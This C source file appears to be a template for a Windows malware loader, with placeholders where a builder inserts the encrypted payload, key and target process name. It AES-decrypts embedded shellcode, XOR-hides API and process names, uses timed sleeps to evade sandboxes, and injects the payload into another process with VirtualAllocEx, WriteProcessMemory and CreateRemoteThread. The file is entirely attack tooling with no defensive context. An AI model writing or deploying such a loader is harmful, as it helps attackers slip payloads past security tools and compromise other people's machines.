#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");

static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");


static void SleepShort(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

unsigned char dKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

LPVOID (WINAPI * Virt_Alloc)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);

char XOR_VARIABLE []= "XOR_KEY";

unsigned char fRandom6 []=VIRALO}; 
unsigned char Random9[]=PROCY};

int aRandom1(char * eRandom5, unsigned int eRandom5_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, eRandom5, &eRandom5_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int bRandom2(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
 
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
//                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int cRandom3(HANDLE hProc, unsigned char * eRandom5, unsigned int eRandom5_len) {

        LPVOID pRemteCode = NULL;
        HANDLE hThread = NULL;

  
        pRemteCode = VirtualAllocEx(hProc, NULL, eRandom5_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemteCode, (PVOID)eRandom5, (SIZE_T)eRandom5_len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                return 0;
        }
        return -1;
}

void gRandom7(char * tada, size_t tada_len, char * XOR_VARIABLE, size_t XOR_VARIABLE_len) {
        int r;
        r = 0;
        for (int i = 0; i < tada_len; i++) {
                if (r == XOR_VARIABLE_len - 1) r = 0;

                tada[i] = tada[i] ^ XOR_VARIABLE[r];
                r++;
        }
}


int main(void) {
	void * Random8_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
    
	int pid = 0;
    HANDLE hProc = NULL;
	char dRandom4 []=KEYVALUE  
	unsigned char eRandom5[] =PAYVAL 
 
	unsigned int eRandom5_len = sizeof(eRandom5);


	FreeConsole;

	gRandom7((char *) fRandom6, sizeof (fRandom6), XOR_VARIABLE, sizeof(XOR_VARIABLE));
	
	SleepShort(3000);

        Virt_Alloc= GetProcAddress(GetModuleHandle(dKernel32), fRandom6);

	SleepShort(4000);

	Random8_mem = Virt_Alloc(0, eRandom5_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	SleepShort(5000);
	aRandom1((char *) eRandom5, eRandom5_len, dRandom4, sizeof(dRandom4));
	
	RtlCopyMemory(Random8_mem, eRandom5, eRandom5_len);
	
	rv = VirtualProtect(Random8_mem, eRandom5_len, PAGE_EXECUTE_READ, &oldprotect);
	SleepShort(6000);

	gRandom7((char *) Random9, sizeof (Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
	
	pid = bRandom2(Random9);

	if (pid) {

		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			cRandom3(hProc, eRandom5, eRandom5_len);
		}
	}
	return 0;
}
